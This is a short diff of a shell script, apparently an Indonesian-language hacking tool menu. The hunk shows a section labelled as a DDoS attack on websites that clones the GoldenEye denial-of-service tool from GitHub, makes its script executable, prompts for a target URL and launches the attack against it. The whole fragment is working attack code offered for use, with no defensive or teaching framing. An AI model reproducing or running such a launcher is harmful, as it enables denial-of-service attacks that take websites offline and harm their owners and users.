@@ -158,8 +158,8 @@ echo "[!]RUNNING TOOLS DDOS ATTACK WEBSITE" | lolcat
 echo "##################################################################################"
 sleep 5
 git clone https://github.com/jseidl/GoldenEye
-chmod +x GoldenEye/*
 cd GoldenEye
+chmod +x goldeneye.py
 echo "╭─[Masukan URL Website]" | lolcat
 read -p"╰─>> " url
 ./goldeneye.py $url -w 10 -d
